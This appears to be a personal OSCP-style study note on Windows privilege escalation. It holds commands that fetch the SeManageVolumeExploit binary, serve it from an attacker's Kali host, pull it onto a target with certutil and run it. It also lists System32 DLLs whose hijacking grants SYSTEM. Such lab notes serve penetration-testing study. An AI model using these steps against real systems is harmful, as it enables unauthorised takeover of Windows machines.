SeManageVolumeExploit.exe
```
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----12ad7f6bad6f---------------------------------------
```

Transfer SeManageVolumeExploit.exe onto TARGET VICTIM
```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/SeManageVolumeExploit.exe SeManageVolumeExploit.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
.\SeManageVolumeExploit.exe
```

DLLREF by Siren Security

```powershell
================================================================C:\Windows\System32\wpcoreutil.dll (Windows Insider service `wisvc` triggerd by Clicking Start Windows Insider Program) ================================================================C:\Windows\System32\phoneinfo.dll (Windows Problem Reporting service) https://twitter.com/404death/status/1262670619067334656 (without reboot by @jonasLyk) ================================================================#dxgi - Trigger is check for protection update 
C:\Windows\System32\wbem\dxgi.dll (windows security -> check for protection update) 
================================================================#tzres.dll C:\Windows\System32\wbem\tzres.dll (systeminfo, NetworkService) 
================================================================### Need to reboot to get NT AUTHORITY\SYSTEM (hijack dll) ### 
C:\Windows\System32\wlbsctrl.dll (IKEEXT service) C:\Windows\System32\wbem\wbemcomn.dll (IP Helper) 
================================================================C:\Windows\System32\ualapi.dll (spooler service) http://www.hexacorn.com/blog/2016/11/08/beyond-good-ol-run-key-part-50/ ================================================================C:\Windows\System32\fveapi.dll (ShellHWDetection Service) @bohops ================================================================C:\Windows\System32\Wow64Log.dll (this dll loaded by other third party services such as GoogleUpdate.exe)
```

```powershell
#tzres.dll  
`C:\Windows\System32\wbem\tzres.dll (systeminfo, NetworkService)`
```

